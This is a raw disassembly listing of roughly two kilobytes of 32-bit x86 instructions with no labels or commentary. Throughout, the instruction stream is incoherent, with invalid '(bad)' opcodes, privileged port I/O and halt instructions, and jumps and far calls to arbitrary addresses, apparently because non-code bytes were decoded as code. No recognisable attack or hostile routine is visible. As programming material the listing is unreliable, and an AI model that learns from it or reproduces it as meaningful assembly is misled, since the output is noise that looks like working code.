  42224a:	or     ecx,DWORD PTR [eax+0x17]
  42224d:	repz sbb edi,DWORD PTR [edx-0x10babbd0]
  422254:	add    ah,BYTE PTR [ecx-0x2536f59b]
  42225a:	xor    dh,BYTE PTR [ebx+eax*8-0x4c9a842]
  422261:	fadd   DWORD PTR [edi]
  422263:	popf   
  422264:	into   
  422265:	pop    ebp
  422266:	jecxz  0x422213
  422268:	jp     0x42226f
  42226a:	ja     0x422278
  42226c:	and    eax,0xeb733c7f
  422271:	and    dl,ch
  422273:	xchg   edx,eax
  422274:	mov    edx,0x17bc3e1e
  422279:	hlt    
  42227a:	aam    0x14
  42227c:	pop    es
  42227d:	xchg   edx,eax
  42227e:	xor    bl,BYTE PTR [esi]
  422280:	je     0x42222e
  422282:	jp     0x42220a
  422284:	pop    ebx
  422285:	gs or  al,0xb
  422288:	cmp    eax,0x1e39f574
  42228d:	ja     0x422213
  42228f:	xchg   ecx,eax
  422290:	mov    gs,WORD PTR [ecx]
  422292:	into   
  422293:	inc    edi
  422294:	sub    ecx,DWORD PTR [eax+ecx*8]
  422297:	mov    esi,0x419bfbfa
  42229c:	rcr    cl,cl
  42229e:	pop    es
  42229f:	pop    ss
  4222a0:	xor    esi,DWORD PTR [edi+0x377b9d4d]
  4222a6:	xor    edi,edx
  4222a8:	mov    dh,0x62
  4222aa:	ja     0x422252
  4222ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222ad:	test   eax,0x33bde878
  4222b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222b3:	sbb    BYTE PTR [ecx+0x67b546c9],bl
  4222b9:	out    dx,al
  4222ba:	and    eax,0xd66d9afd
  4222bf:	shr    BYTE PTR [eax*2-0x7320860c],0x9f
  4222c7:	fild   DWORD PTR [eax-0x1d]
  4222ca:	mov    dl,0x4b
  4222cc:	mov    dh,0x26
  4222ce:	or     al,0x6b
  4222d0:	sub    ecx,DWORD PTR [eax]
  4222d2:	jg     0x4222a0
  4222d4:	jp     0x4222f7
  4222d6:	push   0x43
  4222d8:	repz stc 
  4222da:	jge    0x42234e
  4222dc:	mov    dl,0x67
  4222de:	out    0x9e,al
  4222e0:	or     esp,DWORD PTR [edx]
  4222e2:	(bad)  
  4222e3:	rcl    BYTE PTR [esi+0x50],0x6a
  4222e7:	xchg   edx,eax
  4222e8:	mov    edx,0x7af77e6d
  4222ed:	mov    edx,0xb038ff0c
  4222f2:	(bad)  
  4222f3:	mov    cl,0xad
  4222f5:	fist   WORD PTR [edx+edx*2-0x72]
  4222f9:	or     DWORD PTR [edi],esi
  4222fb:	out    0x40,eax
  4222fd:	inc    ebp
  4222fe:	adc    DWORD PTR [eax],ebx
  422300:	cmp    al,0xa5
  422302:	push   ss
  422303:	push   ecx
  422304:	mov    esp,0x529d8c2b
  422309:	jae    0x4222fa
  42230b:	adc    dl,BYTE PTR [eax+0x24]
  42230e:	cwde   
  42230f:	xchg   bl,cl
  422311:	and    cl,BYTE PTR [eax+0x75]
  422314:	jns    0x422342
  422316:	push   ebp
  422317:	fistp  QWORD PTR [ecx-0x7ce80349]
  42231d:	rcr    BYTE PTR [edx+0x8],cl
  422320:	call   0xf9148c26
  422325:	ja     0x4222db
  422327:	pop    eax
  422328:	addr16 out dx,eax
  42232a:	inc    ecx
  42232b:	rol    DWORD PTR [edi-0x2395c467],0x52
  422332:	or     al,0xf9
  422334:	mov    edi,0x84733adc
  422339:	push   ebx
  42233a:	neg    BYTE PTR gs:[ecx+0x3783536c]
  422341:	sub    eax,0x4b08ecc2
  422346:	das    
  422347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422348:	shr    DWORD PTR [edx+0x3e],cl
  42234b:	inc    ebp
  42234c:	mov    edi,0x8e7d2d1e
  422351:	aas    
  422352:	das    
  422353:	mov    edx,0xbfe41d77
  422358:	test   eax,0x3796f3eb
  42235d:	adc    eax,0xf0bf1790
  422362:	lahf   
  422363:	jae    0x42239a
  422365:	test   DWORD PTR [edx],0x3f352637
  42236b:	aaa    
  42236c:	xor    edx,DWORD PTR [ecx]
  42236e:	repz adc BYTE PTR [edx-0x47f71e49],bl
  422375:	inc    edx
  422376:	adc    BYTE PTR [edi+0xc94ef62],ch
  42237c:	push   ebx
  42237d:	sub    DWORD PTR [eax-0x3d],ebx
  422380:	dec    esi
  422381:	pop    ds
  422382:	push   es
  422383:	dec    edx
  422384:	push   es
  422385:	shl    DWORD PTR ds:0xc951501f,0xa1
  42238c:	sbb    DWORD PTR [esi-0x57],esp
  42238f:	add    ebx,DWORD PTR [edi+ebp*4]
  422392:	mov    eax,ds:0x74122b1c
  422397:	lea    ecx,[eax-0x54]
  42239a:	push   0xd0526c2c
  42239f:	lds    eax,FWORD PTR ds:0x9624bf19
  4223a5:	les    ecx,FWORD PTR [ebx+ecx*2+0x16]
  4223a9:	dec    esi
  4223aa:	ja     0x422415
  4223ac:	jae    0x42236d
  4223ae:	(bad)  
  4223b0:	iret   
  4223b1:	rcl    BYTE PTR [eax],0xe6
  4223b4:	ss iret 
  4223b6:	outs   dx,BYTE PTR ds:[esi]
  4223b7:	sub    ebx,0x39
  4223ba:	xchg   BYTE PTR [edi],al
  4223bc:	imul   ecx,DWORD PTR [edi+0x14069be9],0x3b37c531
  4223c6:	push   ecx
  4223c7:	mov    eax,ds:0xbd116b1f
  4223cc:	mov    ds:0x93749d1c,al
  4223d1:	cli    
  4223d2:	out    dx,eax
  4223d3:	clc    
  4223d4:	(bad)  
  4223d5:	xchg   edi,eax
  4223d6:	sbb    BYTE PTR [eax],0x6c
  4223d9:	fisttp DWORD PTR [edi+0x3c75edea]
  4223df:	or     bl,BYTE PTR ds:[edx+0x43]
  4223e3:	xor    al,0x12
  4223e5:	test   al,0xa1
  4223e7:	xor    eax,0x687dddf5
  4223ec:	pop    edi
  4223ed:	inc    ecx
  4223ee:	and    eax,0x86e30a68
  4223f3:	sbb    esi,DWORD PTR [eax+0x49]
  4223f6:	pushf  
  4223f7:	add    dl,BYTE PTR fs:[eax]
  4223fa:	pop    ebx
  4223fb:	in     eax,dx
  4223fc:	sub    ch,ch
  4223fe:	or     eax,0xf82b60d9
  422403:	icebp  
  422404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422405:	addr16 ja 0x422432
  422408:	std    
  422409:	fimul  DWORD PTR [edi]
  42240b:	imul   esp,esi,0xffffffa5
  42240e:	adc    al,0xe7
  422410:	je     0x4223cd
  422412:	shl    DWORD PTR [edi],0x44
  422415:	sbb    eax,0xe4a5fba6
  42241a:	cdq    
  42241b:	fst    DWORD PTR [ebx]
  42241d:	je     0x42249a
  42241f:	(bad)  
  422420:	cmp    eax,0x98866ef0
  422425:	sub    ebp,esp
  422427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422428:	or     cl,BYTE PTR [ebx]
  42242a:	xchg   edx,eax
  42242b:	xchg   esi,eax
  42242c:	in     eax,0x42
  42242e:	xchg   ch,dl
  422430:	adc    al,BYTE PTR [ecx]
  422432:	cmp    DWORD PTR [edi],edi
  422434:	popf   
  422435:	out    0x94,al
  422437:	fwait
  422438:	inc    ebx
  422439:	fwait
  42243a:	ds adc ch,dh
  42243d:	mov    eax,0x2e5fc37d
  422442:	mov    ah,0xea
  422444:	stos   DWORD PTR es:[edi],eax
  422445:	das    
  422446:	hlt    
  422447:	in     al,dx
  422448:	fprem  
  42244a:	xlat   BYTE PTR ds:[ebx]
  42244b:	ins    BYTE PTR es:[edi],dx
  42244c:	xchg   edi,eax
  42244d:	xor    BYTE PTR [ebp+0x74bb9737],ah
  422453:	bound  ebx,QWORD PTR [edi-0x6a307dca]
  422459:	ins    DWORD PTR es:[edi],dx
  42245a:	xchg   esp,eax
  42245c:	or     al,0xf6
  42245e:	ins    BYTE PTR es:[edi],dx
  42245f:	or     al,0x8
  422461:	mov    WORD PTR [edx-0x67f4f883],es
  422467:	retf   
  422468:	dec    ebp
  422469:	jle    0x422476
  42246b:	pop    esi
  42246c:	imul   edi,DWORD PTR gs:[esi-0x2b4b4f37],0x50
  422474:	pop    ecx
  422475:	and    BYTE PTR [esi+edx*2-0x1249592c],dl
  42247c:	cdq    
  42247d:	mov    WORD PTR ds:[ebp-0x78],cs
  422481:	cmp    edi,DWORD PTR [ebx]
  422483:	std    
  422484:	test   DWORD PTR [ecx+0x2c00c4e6],ebx
  42248a:	loopne 0x422465
  42248c:	pop    esp
  42248d:	and    BYTE PTR [esi-0x62],0xb3
  422491:	sbb    esi,eax
  422493:	(bad)  
  422494:	push   0x88fbd47b
  422499:	sub    ch,ah
  42249b:	inc    esi
  42249c:	mov    DWORD PTR [edx],esi
  42249e:	sub    sp,cx
  4224a1:	xchg   ebx,eax
  4224a2:	sbb    bl,dl
  4224a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224a5:	sbb    BYTE PTR [eax+0x240d785d],dh
  4224ab:	mov    ds:0x859fb1cf,eax
  4224b0:	push   ss
  4224b1:	jle    0x4224c3
  4224b3:	dec    esp
  4224b4:	imul   edx,DWORD PTR [ebx-0x2e2185e4],0x26d98d7d
  4224be:	adc    DWORD PTR [ecx+eax*4],ebp
  4224c1:	xor    DWORD PTR [ecx+0x33],ebp
  4224c4:	pop    ecx
  4224c5:	shr    DWORD PTR [ebx+0x36],1
  4224c8:	shr    DWORD PTR [ecx+0x1b],0xad
  4224cc:	jnp    0x4224e5
  4224ce:	adc    ch,BYTE PTR [ecx+ebx*8]
  4224d1:	dec    edi
  4224d2:	push   edi
  4224d3:	inc    ebx
  4224d4:	sub    esi,esi
  4224d6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4224d8:	adc    edx,eax
  4224da:	lahf   
  4224db:	and    DWORD PTR [edx+0x1],edx
  4224de:	push   ebp
  4224df:	mov    ah,BYTE PTR [edi-0x2f]
  4224e2:	cmc    
  4224e3:	lahf   
  4224e4:	push   cs
  4224e5:	ror    BYTE PTR [esi-0x10],1
  4224e8:	ja     0x4224c1
  4224ea:	scas   al,BYTE PTR es:[edi]
  4224eb:	mov    BYTE PTR [edi+0x75240152],ah
  4224f1:	fcmove st,st(4)
  4224f3:	mov    bl,0x3
  4224f5:	addr16 pop ds
  4224f7:	repnz sar BYTE PTR [esi-0x9],1
  4224fb:	lds    edi,FWORD PTR [ecx+edx*4+0x2d]
  4224ff:	mov    ch,0x99
  422501:	repnz xor eax,0x6d8eea19
  422507:	jg     0x4224b7
  422509:	jns    0x422577
  42250b:	push   0x7a
  42250d:	jge    0x42249e
  42250f:	pop    ebp
  422510:	scas   eax,DWORD PTR es:[edi]
  422511:	sub    DWORD PTR [ebx-0x19642b3d],edx
  422517:	ret    
  422518:	mov    ah,0x2f
  42251a:	xor    ch,BYTE PTR [eax+0x9]
  42251d:	cli    
  42251e:	dec    edx
  42251f:	add    dl,cl
  422521:	cmp    eax,0x23e88a55
  422526:	mov    edi,esp
  422528:	arpl   WORD PTR [ebx-0x5d],cx
  42252b:	neg    dl
  42252d:	mov    BYTE PTR [ebp-0x59fbaece],cl
  422533:	arpl   dx,sp
  422535:	pusha  
  422536:	mov    ah,0xe1
  422538:	push   edx
  422539:	iret   
  42253a:	mov    ch,0x57
  42253c:	cmc    
  42253d:	and    dl,al
  42253f:	gs das 
  422541:	fwait
  422542:	(bad)  
  422543:	clc    
  422544:	xchg   ecx,eax
  422545:	xor    al,0xa1
  422547:	dec    ecx
  422548:	nop
  422549:	dec    esp
  42254a:	mov    ebx,0x931d3096
  42254f:	imul   BYTE PTR [edx-0x5]
  422552:	stos   DWORD PTR es:[edi],eax
  422553:	inc    ebp
  422554:	(bad)  [ebp-0x35190dd2]
  42255a:	pop    ebx
  42255b:	jmp    0xeb84cc51
  422560:	inc    eax
  422561:	dec    ebp
  422562:	sar    DWORD PTR [ebx+0x62],1
  422565:	add    dl,dl
  422567:	add    eax,0x1fdcbad4
  42256c:	jo     0x422515
  42256e:	retf   
  42256f:	aas    
  422570:	dec    esp
  422571:	(bad)  
  422572:	xor    eax,0xbed5eb3e
  422577:	scas   eax,DWORD PTR es:[edi]
  422578:	or     cl,0x38
  42257b:	les    ecx,FWORD PTR [edi+eiz*4+0x6790934e]
  422582:	sub    BYTE PTR [eax+0x23],0xe
  422586:	sbb    al,0x2
  422588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422589:	cmp    DWORD PTR [edi+eiz*2-0x4fc96c9c],eax
  422590:	push   cs
  422591:	aad    0x3d
  422593:	int3   
  422594:	xchg   DWORD PTR [edi],edx
  422596:	into   
  422597:	add    BYTE PTR [ecx-0x7d547a27],al
  42259d:	pusha  
  42259e:	pop    edi
  42259f:	pusha  
  4225a0:	int    0x15
  4225a2:	ret    
  4225a3:	loope  0x42259e
  4225a5:	pop    esp
  4225a6:	jp     0x422552
  4225a8:	push   ebx
  4225a9:	dec    ebx
  4225aa:	into   
  4225ab:	cwde   
  4225ac:	jge    0x42255d
  4225ae:	mov    bh,dh
  4225b0:	aad    0x19
  4225b2:	cmp    bl,ah
  4225b4:	and    edi,edx
  4225b6:	and    ah,BYTE PTR [ebp-0x313b8828]
  4225bc:	jns    0x422555
  4225be:	xchg   BYTE PTR [ecx+edx*8+0x29],dh
  4225c2:	call   0x390ff8c8
  4225c7:	and    al,0xb6
  4225c9:	push   ds
  4225ca:	jmp    0xa6f62d8a
  4225cf:	xchg   edx,eax
  4225d0:	or     BYTE PTR [esi],al
  4225d2:	pop    ds
  4225d3:	cmp    dh,bl
  4225d5:	dec    edx
  4225d6:	xchg   edx,eax
  4225d7:	cdq    
  4225d8:	call   0x6b25:0x598517a4
  4225df:	jmp    0xca0005b8
  4225e4:	bound  esp,QWORD PTR [ecx-0x35fa0461]
  4225ea:	or     DWORD PTR [edx],ecx
  4225ec:	pop    es
  4225ed:	xchg   ebp,eax
  4225ee:	mov    ah,0x20
  4225f0:	cmp    BYTE PTR [edx+0x10ffb5a7],dh
  4225f6:	add    dl,ah
  4225f8:	test   eax,0x3c0ff416
  4225fd:	sub    dh,BYTE PTR ds:0x20cebb43
  422603:	rsqrtps xmm3,XMMWORD PTR [edx-0x75]
  422607:	loop   0x4225c1
  422609:	test   eax,0x2827acf0
  42260e:	inc    ebx
  42260f:	pop    es
  422610:	out    dx,eax
  422611:	inc    edx
  422612:	cmc    
  422613:	je     0x4225bf
  422615:	mov    es,WORD PTR [esi]
  422617:	enter  0x2bcf,0x62
  42261b:	out    dx,eax
  42261c:	sub    edx,DWORD PTR [ebx+0x4a78d22d]
  422622:	mov    al,al
  422624:	cmp    dl,dl
  422626:	out    0x7,eax
  422628:	and    ebp,DWORD PTR [esi+0x62f599ff]
  42262e:	inc    ebp
  42262f:	lods   eax,DWORD PTR ds:[esi]
  422630:	inc    esp
  422631:	push   cs
  422632:	shr    BYTE PTR [ebp+0x37],0x2b
  422636:	lea    edx,[eax]
  422638:	aam    0x75
  42263a:	(bad)  
  42263b:	scas   eax,DWORD PTR es:[edi]
  42263c:	adc    al,0x75
  42263e:	push   ecx
  42263f:	or     eax,0x3836ba28
  422644:	or     al,0xff
  422646:	stc    
  422647:	xor    al,0x4a
  422649:	jae    0x42265b
  42264b:	jmp    0x4226a5
  42264d:	pop    esi
  42264e:	pop    ss
  42264f:	data16 add BYTE PTR [ebx-0x5c232349],dh
  422656:	(bad)  
  422657:	sbb    eax,0xdddf18f5
  42265c:	out    0xfa,eax
  42265e:	cmp    al,0x58
  422660:	inc    esi
  422661:	jbe    0x4226cb
  422663:	lods   eax,DWORD PTR ds:[esi]
  422664:	fcomp  st(7)
  422666:	mov    esi,0x9294d369
  42266b:	ins    DWORD PTR es:[edi],dx
  42266c:	mov    ebx,0x32aae216
  422671:	rcr    BYTE PTR [esi-0xa],1
  422674:	ins    DWORD PTR es:[edi],dx
  422675:	lods   al,BYTE PTR ds:[esi]
  422676:	xchg   BYTE PTR [edi+0x5e],cl
  422679:	jl     0x4226db
  42267b:	push   eax
  42267c:	shl    BYTE PTR [edi-0xe706e5e],0x67
  422683:	gs mov bl,0xa8
  422686:	mov    dl,BYTE PTR [edx-0x3e]
  422689:	bound  ebx,QWORD PTR [esi]
  42268b:	mov    ebp,0x8a10ecb6
  422690:	fnstsw WORD PTR [eax-0x13]
  422693:	pop    edx
  422694:	out    dx,al
  422695:	dec    ebx
  422696:	adc    ebp,DWORD PTR [ecx]
  422698:	pop    ss
  422699:	adc    eax,0xf1462e6
  42269e:	xchg   ecx,eax
  42269f:	jg     0x4226a2
  4226a1:	sbb    eax,0x9e4cb129
  4226a6:	adc    eax,0xec62ef3f
  4226ab:	hlt    
  4226ac:	fsub   DWORD PTR [edx-0xa]
  4226af:	sub    eax,edx
  4226b1:	out    dx,al
  4226b2:	mov    edi,0xed7d6715
  4226b7:	popa   
  4226b8:	(bad)  
  4226b9:	(bad)  
  4226ba:	adc    al,0xe1
  4226bc:	retf   
  4226bd:	jne    0x4226a9
  4226bf:	xor    DWORD PTR [ebx+0x3f],esi
  4226c2:	retf   
  4226c3:	int    0xd7
  4226c5:	cdq    
  4226c6:	pop    ss
  4226c7:	test   eax,0xd2d9fa4
  4226cc:	lods   eax,DWORD PTR ds:[esi]
  4226cd:	xor    DWORD PTR [ebp-0xeaceaaa],eax
  4226d3:	fdivr  QWORD PTR [ecx]
  4226d5:	inc    esp
  4226d6:	xchg   edx,eax
  4226d7:	lahf   
  4226d8:	enter  0x5be1,0x31
  4226dc:	lahf   
  4226dd:	sbb    DWORD PTR [esi+ebx*8-0xd],ebp
  4226e1:	unpcklps xmm5,xmm7
  4226e4:	or     edx,0x1262214
  4226ea:	nop
  4226eb:	(bad)  
  4226ec:	rol    BYTE PTR [ebx],0x7c
  4226ef:	(bad)  
  4226f0:	xlat   BYTE PTR ds:[ebx]
  4226f1:	cmp    eax,0xeedad8eb
  4226f6:	cwde   
  4226f7:	aaa    
  4226f8:	dec    ecx
  4226f9:	jmp    0x2b5fe31c
  4226fe:	sbb    ch,BYTE PTR [esi-0x21efdf6f]
  422704:	pop    edx
  422705:	cs mov ah,0x88
  422708:	ins    DWORD PTR es:[edi],dx
  422709:	lahf   
  42270a:	or     eax,0x4d05a032
  42270f:	js     0x42273c
  422711:	pop    eax
  422712:	mov    edx,0x3b395be9
  422717:	sub    al,0x92
  422719:	repz xchg ecx,eax
  42271b:	inc    edi
  42271c:	dec    esp
  42271d:	(bad)  
  42271f:	in     al,0xd8
  422721:	stos   BYTE PTR es:[edi],al
  422722:	sti    
  422723:	push   esi
  422724:	mov    eax,ds:0x47a766ae
  422729:	dec    ecx
  42272a:	in     eax,dx
  42272b:	sub    ecx,DWORD PTR [edi-0x7b]
  42272e:	iret   
  42272f:	retf   
  422730:	js     0x4226db
  422732:	in     al,0x14
  422734:	xor    bh,dl
  422736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422737:	or     al,0x2b
  422739:	jp     0x42277c
  42273b:	xchg   ecx,eax
  42273c:	mov    ds:0xf6ece18a,eax
  422741:	xor    ebp,DWORD PTR [ebx+edi*1-0x669452cf]
  422748:	adc    ch,dl
  42274a:	test   DWORD PTR [edi+edi*8],esi
  42274d:	stos   BYTE PTR es:[edi],al
  42274e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42274f:	push   ecx
  422750:	jl     0x42276e
  422752:	stos   DWORD PTR es:[edi],eax
  422753:	jp     0x42275b
  422755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422756:	mov    ecx,0x6afeba70
  42275b:	mov    ah,0xf
  42275d:	dec    edx
  42275e:	push   0xffffffbe
  422760:	std    
  422761:	out    0x7d,al
  422763:	mov    dh,0xce
  422765:	sub    DWORD PTR [eax+0x1de4b7af],edi
  42276b:	sahf   
  42276c:	add    al,0x95
  42276e:	shl    BYTE PTR [ecx+eiz*8],0xe2
  422772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422773:	xchg   edx,eax
  422774:	fwait
  422775:	pushf  
  422776:	lock fistp WORD PTR [esi+esi*2]
  42277a:	ins    DWORD PTR es:[edi],dx
  42277b:	outs   dx,BYTE PTR ds:[esi]
  42277c:	fstp   TBYTE PTR [edi-0xd3d9101]
  422782:	mov    al,ds:0x75b0275e
  422787:	add    ch,BYTE PTR [edi-0x22032f2c]
  42278d:	adc    ebx,edx
  42278f:	fidivr DWORD PTR [edx+0x6d]
  422792:	mov    al,ds:0x27258677
  422797:	or     ebx,ebx
  422799:	pop    esi
  42279a:	adc    DWORD PTR [ebp-0x575e16a3],ecx
  4227a0:	stc    
  4227a1:	loope  0x4227be
  4227a3:	add    BYTE PTR [edi],cl
  4227a5:	fild   WORD PTR [ecx]
  4227a7:	clc    
  4227a8:	pop    ecx
  4227a9:	dec    ecx
  4227aa:	out    dx,eax
  4227ab:	adc    al,0x41
  4227ad:	enter  0x983d,0x99
  4227b1:	ror    BYTE PTR [edx+0x25],1
  4227b4:	imul   ebp,DWORD PTR [ecx-0x23],0xf042a465
  4227bb:	loopne 0x4227be
  4227bd:	dec    ebx
  4227be:	xchg   ebx,eax
  4227bf:	dec    esi
  4227c0:	aad    0x87
  4227c2:	hlt    
  4227c3:	and    eax,0xbe667d3d
  4227c8:	xor    eax,0x36c4fac5
  4227cd:	or     al,BYTE PTR [ebx+0x40412141]
  4227d3:	int    0x72
  4227d5:	(bad)  [edx]
  4227d7:	xor    ebp,DWORD PTR [eax]
  4227d9:	push   esi
  4227da:	cwde   
  4227db:	dec    ebx
  4227dc:	dec    bx
  4227de:	ss cwde 
  4227e0:	mov    ah,0x9a
  4227e2:	int3   
  4227e3:	es loopne 0x4227d1
  4227e6:	xchg   ebp,eax
  4227e7:	shl    DWORD PTR [edx-0x3de8574c],cl
  4227ed:	rol    BYTE PTR [edi-0x34],1
  4227f0:	je     0x4227ca
  4227f2:	dec    ecx
  4227f3:	(bad)  [esi]
  4227f5:	int    0xab
  4227f7:	push   ss
  4227f8:	cmp    cl,BYTE PTR [eax+ebx*4+0x5d]
  4227fc:	sbb    ebp,ecx
  4227fe:	sti    
  4227ff:	(bad)  
  422800:	jbe    0x42279f
  422802:	pop    edi
  422803:	add    esi,DWORD PTR [ecx]
  422805:	jns    0x4227a2
  422807:	jl     0x422863
  422809:	rol    dl,cl
  42280b:	sub    DWORD PTR [eax+0x2105304b],0x7733b5b
  422815:	nop
  422816:	mov    esp,0xc3095440
  42281b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42281c:	mov    bh,0x5a
  42281e:	cmp    eax,0xaf3a99b
  422823:	inc    edx
  422824:	bound  esp,QWORD PTR [edi+0x3a]
  422827:	dec    BYTE PTR [esi-0x7b]
  42282a:	push   esi
  42282b:	mov    ds:0x95f8d18d,al
  422830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422831:	sbb    DWORD PTR [ecx-0x5626b52f],ecx
  422837:	test   DWORD PTR [eax-0x14],edi
  42283a:	inc    ebp
  42283b:	xchg   BYTE PTR [esi+0x76],ch
  42283e:	les    ebp,FWORD PTR [eax-0x5c]
  422841:	stos   DWORD PTR es:[edi],eax
  422842:	fwait
  422843:	stos   BYTE PTR es:[edi],al
  422844:	pop    ss
  422845:	pop    edi
  422846:	inc    ecx
  422847:	cmp    ah,bl
  422849:	sahf   
  42284a:	ss and ah,dl
  42284d:	ja     0x4228af
  42284f:	ja     0x4227d2
  422851:	mov    DWORD PTR [esi-0x525a07e9],eax
  422857:	mov    ecx,DWORD PTR [ebp-0x5f34de8a]
  42285d:	dec    eax
  42285e:	or     DWORD PTR [ebp*1+0x271602bc],edx
  422865:	fisttp DWORD PTR [ebp*4-0x78be516f]
  42286c:	lods   al,BYTE PTR ds:[esi]
  42286d:	mov    ah,0x9b
  42286f:	cwde   
  422870:	les    edi,FWORD PTR [ebx]
  422872:	push   esi
  422873:	sub    edi,DWORD PTR [ebx]
  422875:	cli    
  422876:	xor    BYTE PTR [ebx-0x4f],dl
  422879:	cld    
  42287a:	scas   al,BYTE PTR es:[edi]
  42287b:	pop    edi
  42287c:	sbb    eax,0x3e3c3d4b
  422881:	add    al,0x36
  422883:	cmp    al,0x8d
  422885:	and    eax,0x712bee0a
  42288a:	mov    eax,ds:0xdaefefec
  42288f:	jns    0x422909
  422891:	dec    ebp
  422892:	jp     0x422814
  422894:	jecxz  0x422874
  422896:	sahf   
  422897:	fld    TBYTE PTR [ebp-0x344a90cc]
  42289d:	add    DWORD PTR [ecx+0x5c],ecx
  4228a0:	je     0x422876
  4228a2:	adc    eax,0x1b4b8258
  4228a7:	inc    ebx
  4228a8:	jne    0x4228f5
  4228aa:	mov    bl,0x27
  4228ac:	mov    ch,BYTE PTR [ebp-0x120e3e15]
  4228b2:	add    DWORD PTR [eax-0x65ec5d13],edi
  4228b8:	idiv   BYTE PTR [ecx-0x73]
  4228bb:	ins    BYTE PTR es:[edi],dx
  4228bc:	mov    dh,0xf4
  4228be:	add    bh,cl
  4228c0:	inc    esi
  4228c1:	mov    ch,0x67
  4228c3:	or     al,0xac
  4228c5:	jge    0x42288b
  4228c7:	shl    DWORD PTR [eax-0x6e],cl
  4228ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228cb:	xchg   ecx,eax
  4228cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228cd:	sbb    BYTE PTR [edi-0x4db376df],dh
  4228d3:	or     eax,0xd59ab817
  4228d8:	adc    DWORD PTR ds:0x598b6459,esp
  4228de:	lahf   
  4228df:	sub    edi,ebx
  4228e1:	xor    dh,cl
  4228e3:	mov    DWORD PTR ds:0x8fcdca13,ebp
  4228e9:	mov    ecx,DWORD PTR [ebp+0x55]
  4228ec:	paddd  mm4,mm1
  4228ef:	ins    BYTE PTR es:[edi],dx
  4228f0:	xchg   DWORD PTR [esi+0x14],eax
  4228f3:	popf   
  4228f4:	fucomip st,st(5)
  4228f6:	sub    BYTE PTR [ebp+edi*8-0x6f],bl
  4228fa:	fs nop
  4228fc:	enter  0xe6ee,0xe3
  422900:	inc    esi
  422901:	pop    ebp
  422902:	cdq    
  422903:	fimul  DWORD PTR [ecx+0x76414258]
  422909:	mov    bl,0x44
  42290b:	or     bl,BYTE PTR [ebx+ebp*8]
  42290e:	adc    al,0x41
  422910:	add    ebx,esi
  422912:	mov    ds:0xb3e64ebf,al
  422917:	lea    ecx,es:[ecx-0x1c]
  42291b:	sub    ebx,edx
  42291d:	test   DWORD PTR ds:0xf6308024,ebp
  422923:	mov    edi,0x7a564b4e
  422928:	jl     0x42298a
  42292a:	call   0xf7439ca2
  42292f:	sbb    cl,BYTE PTR [ebx-0x269712ba]
  422935:	mov    edi,0xf3048215
  42293a:	xor    ecx,ebp
  42293c:	mov    ah,BYTE PTR [ebx]
  42293e:	cld    
  42293f:	mov    dl,0xc0
  422941:	mov    ebp,0x99ff1ea2
  422946:	lds    edi,FWORD PTR [ebp+0x412ce4f0]
  42294c:	repz or ebx,DWORD PTR [edi]
  42294f:	sbb    BYTE PTR ds:0x64e8b86f,0x0
  422956:	dec    ebp
  422957:	cmp    bh,bh
  422959:	xor    BYTE PTR [edx+0x34],dh
  42295c:	call   0x7e96515f
  422961:	xchg   ebp,eax
  422962:	cmc    
  422963:	inc    ebp
  422964:	sbb    edx,ebp
  422966:	(bad)  
  422967:	xchg   ecx,eax
  422968:	pop    esp
  422969:	rcr    bh,0xb9
  42296c:	fdivr  DWORD PTR [edx-0x7a]
  42296f:	call   0x52411c0b
  422974:	clc    
  422975:	adc    eax,0x419c3833
  42297a:	mov    eax,0xe31e1e48
  42297f:	pop    edi
  422980:	adc    eax,0x135ec997
  422985:	std    
  422986:	cmp    eax,DWORD PTR [ebx]
  422988:	or     cl,BYTE PTR cs:[edi]
  42298b:	aas    
  42298c:	fbstp  TBYTE PTR [esi]
  42298e:	ja     0x4229b8
  422990:	adc    al,0x52
  422992:	dec    ebp
  422993:	pop    edx
  422994:	pop    esi
  422995:	pusha  
  422996:	pop    esp
  422997:	and    eax,0xa0a9fefa
  42299c:	out    dx,eax
  42299d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42299e:	jnp    0x4229d0
  4229a0:	jno    0x4229a9
  4229a2:	call   0x553002ec
  4229a7:	cwde   
  4229a8:	loope  0x4229d4
  4229aa:	jmp    0xea0580fd
  4229af:	js     0x422a0f
  4229b1:	or     eax,0xec4b355a
  4229b6:	clc    
  4229b7:	xchg   edx,eax
  4229b8:	inc    ecx
  4229b9:	mov    dh,0xae
  4229bb:	retf   0x7219
  4229be:	or     eax,0xe162c6c0
  4229c3:	rcl    BYTE PTR ds:0xda6121dc,cl
  4229c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229ca:	pop    edi
  4229cb:	mov    ds:0xfc44b7d5,al
  4229d0:	inc    ebp
  4229d1:	mov    dh,0x92
  4229d3:	sub    BYTE PTR [edx+edi*4-0x6e],al
  4229d7:	xchg   ecx,eax
  4229d8:	mov    eax,ds:0x7319d48c
  4229dd:	jle    0x4229a5
  4229df:	aam    0x6a
  4229e1:	mov    BYTE PTR [edi+0x65],dl
  4229e4:	lock not DWORD PTR [edx+0x36c40207]
  4229eb:	cdq    
  4229ec:	out    0x56,eax
  4229ee:	pop    ss
  4229ef:	jl     0x4229b0
  4229f1:	test   eax,0x23c2e2da
  4229f6:	dec    edi
  4229f7:	loop   0x422a5b
  4229f9:	cwde   
  4229fa:	jmp    0x422a69
  4229fc:	jp     0x422a07
  4229fe:	push   0x47e30b4
  422a03:	mov    ebp,0xd26ba038
  422a08:	jmp    0xf5f04ea7
  422a0d:	js     0x4229c6
  422a0f:	and    eax,DWORD PTR [ebp-0x7359ba3b]
  422a15:	push   esi
  422a16:	aaa    
